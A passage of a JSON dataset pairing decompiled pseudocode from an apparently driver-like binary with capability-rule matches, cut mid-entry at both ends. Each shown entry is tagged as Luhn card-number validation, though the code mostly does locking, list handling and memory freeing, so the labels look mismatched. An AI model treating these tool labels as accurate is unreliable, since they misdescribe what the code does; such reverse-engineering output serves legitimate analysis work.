(*0x7b1b4 == 0) {\n                    do {\n                        cVar2 = (**0x11468)(arg1_00 + uVar6);\n                        if ((cVar2 == '\\0') || (cVar2 = (**0x11468)(arg1_00 + uVar6 + 0x30),  cVar2 == '\\0')) break;\n                        if ((*pcVar7 == -0x74) && (uVar5 = uVar6,  *(pcVar7 + 2) == 0x30)) goto code_r0x00033b2a;\n                        uVar5 = uVar6 + 8;\n                        uVar6 = uVar5;\n                        pcVar7 = pcVar7 + 8;\n                    } while (uVar5 < 0x800);\n                    uVar6 = *0x7b1b4;\n                    uVar5 = *0x7b1b4;\ncode_r0x00033b2a:\n                    *0x7b1b4 = uVar5;\n                    if (uVar6 == 0) goto joined_r0x00033a9d;\n                }\n                iVar3 = fcn.0003354c(arg1_00, *(arg1_00 + uVar6 + 8), 0);\n                if ((iVar3 != 0) || (iVar3 = fcn.0003354c(arg1_00, *(arg1_00 + uVar6 + 0x10), 2),  iVar3 != 0)) break;\n            } while( true );\n        }\ncode_r0x00033b6b:\n        fcn.00033380(arg1);\n    }\n    return iVar3;\n}\n",
        "token_count": 979
    },
    "00033bd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00033bd8(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong unaff_RBX;\n    ulong unaff_RSI;\n    int64_t iVar2;\n    int32_t iVar3;\n    ulong unaff_RDI;\n    ulong noname_3;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    int32_t in_stack_00000010;\n    uint in_stack_00000014;\n    ulong arg1_00;\n    ulong arg1_01;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong noname_4;\n    ulong noname_5;\n    ulong noname_6;\n    int64_t in_stack_ffffffffffffffe0;\n    \n    noname_3 = 0x7b1b0;\n    arg1_01 = 0;\n    noname_4 = 0;\n    noname_5 = 0;\n    noname_6 = 0;\n    arg1_00 = 0;\n    iVar1 = fcn.0003a4b0(arg1, &stack0xffffffffffffffe0, &stack0x00000010, 0x7b1b0);\n    if (iVar1 == 0) {\n        fcn.000313e0(0x7b1c0);\n        iVar1 = fcn.0002f96c(0x14570, &stack0x00000018);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0004afbc(arg1_00, 0x14290, &stack0x00000020);\n            if (iVar1 == 0) {\n                iVar1 = fcn.0004afbc(arg1_00, 0x14270, &stack0xffffffffffffffc8);\n                if (iVar1 == 0) {\n                    iVar1 = fcn.0004afbc(arg1_00, 0x14868, &stack0xffffffffffffffd0);\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.0004afbc(arg1_00, 0x14850, &stack0xffffffffffffffd8);\n                        if (iVar1 == 0) {\n                            iVar1 = fcn.00051f30(arg1_01, 0x33b94, 0x7b1e8, noname_3, noname_4, noname_5, noname_6, \n                                                 in_stack_ffffffffffffffe0, unaff_RDI, unaff_RSI, unaff_RBX, \n                                                 in_stack_00000000, in_stack_00000008, \n                                                 CONCAT44(in_stack_00000014, in_stack_00000010), arg1_00, arg1_01, \n                                                 in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                                                 in_stack_00000040, in_stack_00000048, in_stack_00000050, \n                                                 in_stack_00000058, in_stack_00000060);\n                            if (iVar1 == 0) {\n                                iVar1 = fcn.00051f30(noname_4, 0x33524, 0x7b1f0, noname_3, noname_4, noname_5, noname_6\n                                                     , in_stack_ffffffffffffffe0, unaff_RDI, unaff_RSI, unaff_RBX, \n                                                     in_stack_00000000, in_stack_00000008, \n                                                     CONCAT44(in_stack_00000014, in_stack_00000010), arg1_00, arg1_01, \n                                                     in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                                                     in_stack_00000040, in_stack_00000048, in_stack_00000050, \n                                                     in_stack_00000058, in_stack_00000060);\n                                if (iVar1 == 0) {\n                                    iVar1 = fcn.00051f30(noname_5, 0x33784, 0x7b1f8, noname_3, noname_4, noname_5, \n                                                         noname_6, in_stack_ffffffffffffffe0, unaff_RDI, unaff_RSI, \n                                                         unaff_RBX, in_stack_00000000, in_stack_00000008, \n                                                         CONCAT44(in_stack_00000014, in_stack_00000010), arg1_00, \n                                                         arg1_01, in_stack_00000028, in_stack_00000030, \n                                                         in_stack_00000038, in_stack_00000040, in_stack_00000048, \n                                                         in_stack_00000050, in_stack_00000058, in_stack_00000060);\n                                    if (iVar1 == 0) {\n                                        iVar1 = fcn.00051f30(noname_6, 0x32f10, 0x7b200, noname_3, noname_4, noname_5, \n                                                             noname_6, in_stack_ffffffffffffffe0, unaff_RDI, unaff_RSI, \n                                                             unaff_RBX, in_stack_00000000, in_stack_00000008, \n                                                             CONCAT44(in_stack_00000014, in_stack_00000010), arg1_00, \n                                                             arg1_01, in_stack_00000028, in_stack_00000030, \n                                                             in_stack_00000038, in_stack_00000040, in_stack_00000048, \n                                                             in_stack_00000050, in_stack_00000058, in_stack_00000060);\n                                        if ((iVar1 == 0) && (iVar3 = 0,  0 < in_stack_00000010)) {\n                                            iVar2 = 0;\n                                            do {\n                                                iVar1 = fcn.000339c0(*(iVar2 + in_stack_ffffffffffffffe0));\n                                                if (iVar1 != 0) break;\n                                                iVar3 = iVar3 + 1;\n                                                iVar2 = iVar2 + 8;\n                                            } while (iVar3 < in_stack_00000010);\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.0002fc50(in_stack_ffffffffffffffe0);\n    if (iVar1 != 0) {\n        fcn.000337fc();\n    }\n    return iVar1;\n}\n",
        "token_count": 1475
    },
    "00033d94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00033d94(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    ulong uVar2;\n    uint64_t uVar3;\n    bool bVar4;\n    uchar auStackX24 [16];\n    \n    puVar1 = fcn.0002fbf0(0x30);\n    uVar2 = 0;\n    if (puVar1 == NULL) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        fcn.00061a56(puVar1);\n        puVar1[3] = *0x88920 + arg1;\n        uVar3 = *0x8896c;\n        puVar1[2] = arg1;\n        *(puVar1 + 1) = arg2;\n        puVar1[4] = uVar3 + arg1;\n        fcn.00031564(0x7b290, auStackX24, 1);\n        LOCK();\n        bVar4 = *0x7b2f0 == 0;\n        *0x7b2f0 = *0x7b2f0 ^ bVar4 * *0x7b2f0;\n        if (bVar4) {\n            uVar2 = 0x21590006;\n        }\n        else {\n            *puVar1 = *0x7b2a8;\n            *0x7b2a8 = puVar1;\n        }\n        fcn.00031598(0x7b290, auStackX24, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 352
    },
    "00033e50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00033e50(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    ulong *arg1_00;\n    ulong *puStackX8;\n    uchar auStackX16 [24];\n    \n    puStackX8 = NULL;\n    if (arg1 == 0) {\n        uVar1 = 0xc0000008;\n    }\n    else {\n        fcn.00031564(0x7b290, auStackX16, 0);\n        arg1_00 = fcn.00036a00(arg1, 1, &puStackX8);\n        if (arg1_00 != NULL) {\n            if (puStackX8 == NULL) {\n                *0x7b2a8 = *arg1_00;\n            }\n            else {\n                *puStackX8 = *arg1_00;\n            }\n        }\n        fcn.00031598(0x7b290, auStackX16, 0);\n        if (arg1_00 != NULL) {\n            if (arg1_00[5] != 0) {\n                fcn.00052250(arg1_00[5]);\n                fcn.00052250(arg1_00[5] + 0x10);\n                fcn.00052250(arg1_00[5] + 0x18);\n                fcn.00052250(arg1_00[5] + 0x20);\n                fcn.00052250(arg1_00[5] + 0x28);\n                fcn.00052250(arg1_00[5] + 8);\n                fcn.0002fc50(arg1_00[5]);\n            }\n            fcn.0002fc50(arg1_00);\n        }\n        uVar1 = ~-(arg1_00 != NULL) & 0xc0000008;\n    }\n    return uVar1;\n}\n",
        "token_count": 417
    },
    "00033f48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00033f48(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    int64_t arg1_00;\n    uint64_t arg2_00;\n    int64_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint64_t arg1_01;\n    int32_t iVar8;\n    int64_t *piVar9;\n    int32_t iVar10;\n    uchar auStackX24 [16];\n    uint64_t in_stack_ffffffffffffff98;\n    \n    piVar9 = *(arg1 + 8);\n    iVar6 = 0;\n    iVar7 = 0;\n    iVar8 = iVar6;\n    iVar10 = iVar6;\n    iVar4 = iVar6;\n    if (piVar9 != NULL) {\n        do {\n            uVar1 = *(piVar9 + 3);\n            arg1_01 = uVar1;\n            fcn.0004916c(0);\n            arg1_00 = fcn.0002fbf0(arg1_01);\n            iVar7 = iVar8;\n            if (arg1_00 != 0) {\n                in_stack_ffffffffffffff98 = in_stack_ffffffffffffff98 & 0xffffffff00000000;\n                arg2_00 = (**0x7b020)(piVar9, arg1_01, arg1_00, 0, in_stack_ffffffffffffff98);\n                if (arg2_00 != 0) {\n                    fcn.00031564(0x7b290, auStackX24, 0);\n                    iVar5 = fcn.000366d8(arg2, 1);\n                    if (iVar5 != 0) {\n                        fcn.000428e4(*(iVar5 + 8), arg2_00, arg2_00 + 0xe, uVar1);\n                        iVar4 = iVar6;\n                        if (*(iVar5 + 0x420) != 0) {\n                            iVar4 = fcn.00052b74(*(iVar5 + 0x420), arg2_00, arg1_01, arg1_01);\n                        }\n                    }\n                    fcn.00031598(0x7b290, auStackX24, 0);\n                    if (iVar4 == 0) {\n                        if ((0xd < uVar1) && (iVar3 = fcn.0002fd20(),  *(arg2_00 + 0xc) == iVar3)) {\n                            iVar4 = 1;\n                        }\n                    }\n                    else {\n                        fcn.00049184(0);\n                        fcn.00037054(arg2, arg2_00, arg1_01);\n                    }\n                    cVar2 = fcn.00043244(0, arg2, 0, 0);\n                    in_stack_ffffffffffffff98 = arg2_00;\n                    if (cVar2 == '\\0') {\n                        iVar8 = iVar8 + 1;\n                    }\n                    else {\n                        iVar10 = iVar10 + 1;\n                    }\n                }\n                fcn.0002fc50(arg1_00);\n                iVar7 = iVar8;\n            }\n            piVar9 = *piVar9;\n            iVar8 = iVar7;\n        } while (piVar9 != NULL);\n        if ((0 < iVar7) && (0 < iVar10)) {\n            return 0xffffffff;\n        }\n    }\n    return 0 < iVar7;\n}\n",
        "token_count": 766
    },
    "00034440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00034440(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    ulong *puVar1;\n    ulong uVar2;\n    uchar auStackX8 [32];\n    uchar auStack56 [24];\n    \n    if (arg1 == 0) {\n        if (arg2 == 0) {\n            return 0xc00000ef;\n        }\n    }\n    else if (arg2 != 0) {\n        return 0xc00000ef;\n    }\n    if (arg4 == 0) {\n        fcn.00031564(0x7b290, auStack56, 0);\n    }\n    if (arg2 == 0) {\n        puVar1 = fcn.000366d8(arg1, 0);\n    }\n    else {\n        fcn.00031564(0x7b290, auStackX8, 0);\n        for (puVar1 = *0x7b280; (puVar1 != NULL && (puVar1[0x93] != arg2)); puVar1 = *puVar1) {\n        }\n        fcn.00031598(0x7b290, auStackX8, 0);\n    }\n    if (puVar1 == NULL) {\n        uVar2 = 0xc000000d;\n    }\n    else {\n        *(puVar1 + 0x4c4) = arg3;\n        uVar2 = 0;\n    }\n    if (arg4 == 0) {\n        fcn.00031598(0x7b290, auStack56, 0);\n    }\n    return uVar2;\n}\n",
        "token_count": 367
    },
    "00034948": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00034948(void)\n\n{\n    int32_t iVar1;\n    ulong unaff_RBX;\n    ulong in_R9;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong arg1;\n    ulong noname_12;\n    ulong noname_13;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong noname_4;\n    ulong noname_5;\n    ulong noname_6;\n    ulong in_stack_fffffffffffffff0;\n    \n    arg1 = 0;\n    noname_12 = 0;\n    noname_13 = 0;\n    noname_5 = 0;\n    noname_6 = 0;\n    noname_4 = 0;\n    iVar1 = fcn.0002f96c(0x14570, &stack0x00000008);\n    if (((((iVar1 == 0) && (iVar1 = fcn.0004afbc(in_stack_00000008, 0x14320, &stack0x00000018),  iVar1 == 0)) &&\n         (iVar1 = fcn.0004afbc(in_stack_00000008, 0x14340, &stack0x00000010),  iVar1 == 0)) &&\n        ((((iVar1 = fcn.0004afbc(in_stack_00000008, 0x148c8, &stack0x00000020),  iVar1 == 0 &&\n           (iVar1 = fcn.0004afbc(in_stack_00000008, 0x148b0, &stack0xffffffffffffffd8),  iVar1 == 0)) &&\n          ((iVar1 = fcn.0004afbc(in_stack_00000008, 0x14898, &stack0xffffffffffffffe0),  iVar1 == 0 &&\n           ((iVar1 = fcn.0004afbc(in_stack_00000008, 0x14880, &stack0xffffffffffffffe8),  iVar1 == 0 &&\n            (iVar1 = fcn.00051f30(arg1, 0x34110, 0x7b2b0, in_R9, noname_4, noname_5, noname_6, in_stack_fffffffffffffff0\n                                  , unaff_RBX, in_stack_00000000, in_stack_00000008, arg1, noname_12, noname_13, \n                                  in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                                  in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, \n                                  in_stack_00000068, in_stack_00000070),  iVar1 == 0)))))) &&\n         (iVar1 = fcn.00051f30(noname_12, 0x340e8, 0x7b2b8, in_R9, noname_4, noname_5, noname_6, \n                               in_stack_fffffffffffffff0, unaff_RBX, in_stack_00000000, in_stack_00000008, arg1, \n                               noname_12, noname_13, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                               in_stack_00000040, in_stack_00000048, in_stack_00000050, in_stack_00000058, \n                               in_stack_00000060, in_stack_00000068, in_stack_00000070),  iVar1 == 0)))) &&\n       (((iVar1 = fcn.00051f30(noname_13, 0x34184, 0x7b2c0, in_R9, noname_4, noname_5, noname_6, \n                               in_stack_fffffffffffffff0, unaff_RBX, in_stack_00000000, in_stack_00000008, arg1, \n                               noname_12, noname_13, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                               in_stack_00000040, in_stack_00000048, in_stack_00000050, in_stack_00000058, \n                               in_stack_00000060, in_stack_00000068, in_stack_00000070),  iVar1 == 0 &&\n         (iVar1 = fcn.00051f30(noname_4, 0x3453c, 0x7b2d8, in_R9, noname_4, noname_5, noname_6, \n                               in_stack_fffffffffffffff0, unaff_RBX, in_stack_00000000, in_stack_00000008, arg1, \n                               noname_12, noname_13, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                               in_stack_00000040, in_stack_00000048, in_stack_00000050, in_stack_00000058, \n                               in_stack_00000060, in_stack_00000068, in_stack_00000070),  iVar1 == 0)) &&\n        (iVar1 = fcn.00051f30(noname_5, 0x34514, 0x7b2e0, in_R9, noname_4, noname_5, noname_6, in_stack_fffffffffffffff0\n                              , unaff_RBX, in_stack_00000000, in_stack_00000008, arg1, noname_12, noname_13, \n                              in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                              in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, \n                              in_stack_00000068, in_stack_00000070),  iVar1 == 0)))) {\n        return 0;\n    }\n    fcn.000343a4();\n    return iVar1;\n}\n",
        "token_count": 1426
    },
    "00034b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00034b00(int64_t arg1)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong unaff_RBX;\n    ulong unaff_RBP;\n    ulong unaff_RSI;\n    uint32_t uVar6;\n    ulong unaff_RDI;\n    uchar *puVar8;\n    ulong unaff_R12;\n    ulong unaff_R13;\n    bool bVar9;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    uint32_t in_stack_00000010;\n    uint in_stack_00000014;\n    uint32_t in_stack_00000018;\n    uint in_stack_0000001c;\n    uint32_t in_stack_00000020;\n    uint in_stack_00000024;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    uint32_t in_stack_ffffffffffffffa8;\n    uint32_t in_stack_ffffffffffffffac;\n    uint32_t in_stack_ffffffffffffffb0;\n    uint in_stack_ffffffffffffffb4;\n    ulong in_stack_ffffffffffffffb8;\n    ulong in_stack_ffffffffffffffc0;\n    ulong in_stack_ffffffffffffffc8;\n    int64_t *piVar7;\n    \n    LOCK();\n    bVar9 = *0x7b2f0 == 0;\n    *0x7b2f0 = *0x7b2f0 ^ bVar9 * *0x7b2f0;\n    if (bVar9) {\n        return 0x21590006;\n    }\n    fcn.00031564(0x7b290, &stack0xffffffffffffffb8, 0);\n    iVar4 = fcn.00036a00(arg1, 1, 0);\n    if (iVar4 == 0) {\n        fcn.00031598(0x7b290, &stack0xffffffffffffffb8, 0);\n        return -0x3ffffff8;\n    }\n    iVar5 = *(iVar4 + 0x28);\n    iVar1 = *(iVar4 + 8);\n    fcn.00031598(0x7b290, &stack0xffffffffffffffb8, 0);\n    if (iVar5 != 0) {\n        return -0x3fffffdf;\n    }\n    iVar4 = fcn.0002fbf0(0x30);\n    if (iVar4 == 0) {\n        return -0x3fffff66;\n    }\n    fcn.00061a56(iVar4, 0);\n    uVar6 = *0x888d8;\n    if (iVar1 != 0x14) {\n        uVar6 = *0x88938;\n    }\n    piVar7 = uVar6 + arg1;\n    if (*piVar7 == 0) {\ncode_r0x00034c2e:\n        uVar6 = *0x888e0;\n        if (iVar1 != 0x14) {\n            uVar6 = *0x88940;\n        }\n        piVar7 = uVar6 + arg1;\n        if (*piVar7 != 0) {\n            cVar2 = (**0x11468)();\n            if (cVar2 == '\\0') goto code_r0x00034bd4;\n            puVar8 = &stack0x00000018;\n            iVar3 = fcn.00051574(*piVar7, 0x30, 5, puVar8);\n            if ((iVar3 != 0) ||\n               ((3 < in_stack_00000018 &&\n                (iVar3 = fcn.00051f30(*piVar7, 0x34690, iVar4 + 0x10, puVar8, \n                                      CONCAT44(in_stack_ffffffffffffffac, in_stack_ffffffffffffffa8), \n                                      CONCAT44(in_stack_ffffffffffffffb4, in_stack_ffffffffffffffb0), \n                                      in_stack_ffffffffffffffb8, in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, \n                                      unaff_R13, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX, \n                                      in_stack_00000000, in_stack_00000008, \n                                      CONCAT44(in_stack_00000014, in_stack_00000010), \n                                      CONCAT44(in_stack_0000001c, in_stack_00000018), \n                                      CONCAT44(in_stack_00000024, in_stack_00000020), in_stack_00000028, \n                                      in_stack_00000030, in_stack_00000038, in_stack_00000040),  iVar3 != 0))))\n            goto code_r0x00034ebb;\n        }\n        uVar6 = *0x888e4;\n        if (iVar1 != 0x14) {\n            uVar6 = *0x88944;\n        }\n        piVar7 = uVar6 + arg1;\n        if (*piVar7 != 0) {\n            cVar2 = (**0x11468)();\n            if (cVar2 == '\\0') goto code_r0x00034bd4;\n            puVar8 = &stack0x00000020;\n            iVar3 = fcn.00051574(*piVar7, 0x30, 5, puVar8);\n            if ((iVar3 != 0) ||\n               ((3 < in_stack_00000020 &&\n                (iVar3 = fcn.00051f30(*piVar7, 0x34898, iVar4 + 0x18, puVar8, \n                                      CONCAT44(in_stack_ffffffffffffffac, in_stack_ffffffffffffffa8), \n                                      CONCAT44(in_stack_ffffffffffffffb4, in_stack_ffffffffffffffb0), \n                                      in_stack_ffffffffffffffb8, in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, \n                                      unaff_R13, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX, \n                                      in_stack_00000000, in_stack_00000008, \n                                      CONCAT44(in_stack_00000014, in_stack_00000010), \n                                      CONCAT44(in_stack_0000001c, in_stack_00000018), \n                                      CONCAT44(in_stack_00000024, in_stack_00000020), in_stack_00000028, \n                                      in_stack_00000030, in_stack_00000038, in_stack_00000040),  iVar3 != 0))))\n            goto code_r0x00034ebb;\n        }\n        uVar6 = *0x888f0;\n        if (iVar1 != 0x14) {\n            uVar6 = *0x88950;\n        }\n        piVar7 = uVar6 + arg1;\n        if (*piVar7 != 0) {\n            cVar2 = (**0x11468)();\n            if (cVar2 == '\\0') goto code_r0x00034bd4;\n            puVar8 = &stack0xffffffffffffffa8;\n            iVar3 = fcn.00051574(*piVar7, 0x30, 5, puVar8);\n            if ((iVar3 != 0) ||\n               ((3 < in_stack_ffffffffffffffa8 &&\n                (iVar3 = fcn.00051f30(*piVar7, 0x34384, iVar4 + 0x20, puVar8, \n                                      CONCAT44(in_stack_ffffffffffffffac, in_stack_ffffffffffffffa8), \n                                      CONCAT44(in_stack_ffffffffffffffb4, in_stack_ffffffffffffffb0), \n                                      in_stack_ffffffffffffffb8, in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, \n                                      unaff_R13, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX, \n                                      in_stack_00000000, in_stack_00000008, \n                                      CONCAT44(in_stack_00000014, in_stack_00000010), \n                                      CONCAT44(in_stack_0000001c, in_stack_00000018), \n                                      CONCAT44(in_stack_00000024, in_stack_00000020), in_stack_00000028, \n                                      in_stack_00000030, in_stack_00000038, in_stack_00000040),  iVar3 != 0))))\n            goto code_r0x00034ebb;\n        }\n        uVar6 = *0x88904;\n        if (iVar1 != 0x14) {\n            uVar6 = *0x88964;\n        }\n        piVar7 = uVar6 + arg1;\n        if (*piVar7 != 0) {\n            cVar2 = (**0x11468)();\n            if (cVar2 == '\\0') goto code_r0x00034bd4;\n            puVar8 = &stack0xffffffffffffffac;\n            iVar3 = fcn.00051574(*piVar7, 0x30, 5, puVar8);\n            if ((iVar3 != 0) ||\n               ((3 < in_stack_ffffffffffffffac &&\n                (iVar3 = fcn.00051f30(*piVar7, 0x34570, iVar4 + 0x28, puVar8, \n                                      CONCAT44(in_stack_ffffffffffffffac, in_stack_ffffffffffffffa8), \n                                      CONCAT44(in_stack_ffffffffffffffb4, in_stack_ffffffffffffffb0), \n                                      in_stack_ffffffffffffffb8, in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, \n                                      unaff_R13, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX, \n                                      in_stack_00000000, in_stack_00000008, \n                                      CONCAT44(in_stack_00000014, in_stack_00000010), \n                                      CONCAT44(in_stack_0000001c, in_stack_00000018), \n                                      CONCAT44(in_stack_00000024, in_stack_00000020), in_stack_00000028, \n                                      in_stack_00000030, in_stack_00000038, in_stack_00000040),  iVar3 != 0))))\n            goto code_r0x00034ebb;\n        }\n        uVar6 = *0x888fc;\n        if (iVar1 != 0x14) {\n            uVar6 = *0x8895c;\n        }\n        piVar7 = uVar6 + arg1;\n        if (*piVar7 != 0) {\n            cVar2 = (**0x11468)();\n            if (cVar2 == '\\0') goto code_r0x00034bd4;\n            puVar8 = &stack0xffffffffffffffb0;\n            iVar3 = fcn.00051574(*piVar7, 0x30, 5, puVar8);\n            if ((iVar3 != 0) ||\n               ((3 < in_stack_ffffffffffffffb0 &&\n                (iVar3 = fcn.00051f30(*piVar7, 0x347ec, iVar4 + 8, puVar8, \n                                      CONCAT44(in_stack_ffffffffffffffac, in_stack_ffffffffffffffa8), \n                                      CONCAT44(in_stack_ffffffffffffffb4, in_stack_ffffffffffffffb0), \n                                      in_stack_ffffffffffffffb8, in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, \n                                      unaff_R13, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX, \n                                      in_stack_00000000, in_stack_00000008, \n                                      CONCAT44(in_stack_00000014, in_stack_00000010), \n                                      CONCAT44(in_stack_0000001c, in_stack_00000018), \n                                      CONCAT44(in_stack_00000024, in_stack_00000020), in_stack_00000028, \n                                      in_stack_00000030, in_stack_00000038, in_stack_00000040),  iVar3 != 0))))\n            goto code_r0x00034ebb;\n        }\n        fcn.00031564(0x7b290, &stack0xffffffffffffffb8, 0);\n        iVar5 = fcn.00036a00(arg1, 1, 0);\n        if (iVar5 == 0) {\n            iVar3 = -0x3ffffff8;\n        }\n        else {\n            *(iVar5 + 0x28) = iVar4;\n            iVar3 = 0;\n        }\n        fcn.00031598(0x7b290, &stack0xffffffffffffffb8, 0);\n        if (iVar3 == 0) {\n            return 0;\n        }\n    }\n    else {\n        cVar2 = (**0x11468)();\n        if (cVar2 != '\\0') {\n            puVar8 = &stack0x00000010;\n            iVar3 = fcn.00051574(*piVar7, 0x30, 5, puVar8);\n            if ((iVar3 != 0) ||\n               ((3 < in_stack_00000010 &&\n                (iVar3 = fcn.00051f30(*piVar7, 0x34740, iVar4, puVar8, \n                                      CONCAT44(in_stack_ffffffffffffffac, in_stack_ffffffffffffffa8), \n                                      CONCAT44(in_stack_ffffffffffffffb4, in_stack_ffffffffffffffb0), \n                                      in_stack_ffffffffffffffb8, in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, \n                                      unaff_R13, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX, \n                                      in_stack_00000000, in_stack_00000008, \n                                      CONCAT44(in_stack_00000014, in_stack_00000010), \n                                      CONCAT44(in_stack_0000001c, in_stack_00000018), \n                                      CONCAT44(in_stack_00000024, in_stack_00000020), in_stack_00000028, \n                                      in_stack_00000030, in_stack_00000038, in_stack_00000040),  iVar3 != 0))))\n            goto code_r0x00034ebb;\n            goto code_r0x00034c2e;\n        }\ncode_r0x00034bd4:\n        iVar3 = -0x3ffffffb;\n    }\ncode_r0x00034ebb:\n    fcn.00052250(iVar4);\n    fcn.00052250(iVar4 + 0x10);\n    fcn.00052250(iVar4 + 0x18);\n    fcn.00052250(iVar4 + 0x20);\n    fcn.00052250(iVar4 + 0x28);\n    fcn.00052250(iVar4 + 8);\n    fcn.0002fc50(iVar4);\n    return iVar3;\n}\n",
        "token_count": 3309
    },
    "00034f14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00034f14(ulong arg1, ulong *arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    ulong *arg2_00;\n    uint64_t uVar3;\n    int64_t arg1_00;\n    uchar auStack72 [24];\n    \n    uVar3 = arg4;\n    arg1_00 = 0;\n    fcn.00031564(0x7b290, auStack72, 0);\n    iVar2 = fcn.00036bf8(arg1, 0);\n    if (iVar2 != 0) {\n        arg1_00 = *(iVar2 + 0x490);\n    }\n    fcn.00031598(0x7b290, auStack72, 0);\n    if (arg1_00 == 0) {\n        uVar1 = 0xc00000ef;\n    }\n    else {\n        arg2_00 = fcn.0002fbc4(uVar3 + 0xe);\n        if (arg2_00 == NULL) {\n            uVar1 = 0xc000009a;\n        }\n        else {\n            *arg2_00 = *arg2;\n            *(arg2_00 + 1) = *(arg2 + 1);\n            *(arg2_00 + 0xc) = *(arg2 + 0xc);\n            fcn.000619f6(arg2_00 + 0xe, arg3, uVar3);\n            uVar1 = fcn.0003562c(arg1_00, arg2_00, uVar3 + 0xe);\n            fcn.0002fc50(arg2_00);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 384
    },
    "00035494": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00035494(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t arg1;\n    int32_t aiStackX8 [8];\n    \n    fcn.000387d8();\n    if (*0x7b270 != 0) {\n        (**0x88b18)();\n    }\n    arg1 = 0;\n    do {\n        iVar1 = fcn.0003673c(arg1, aiStackX8);\n        if ((iVar1 == 0) && (aiStackX8[0] != 0)) {\n            fcn.000367a0(arg1);\n        }\n        uVar2 = arg1 + 1;\n        arg1 = uVar2;\n    } while (uVar2 < 100);\n    fcn.00052250(0x7b2c8);\n    return 0;\n}\n",
        "token_count": 194
    },
    "00035780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
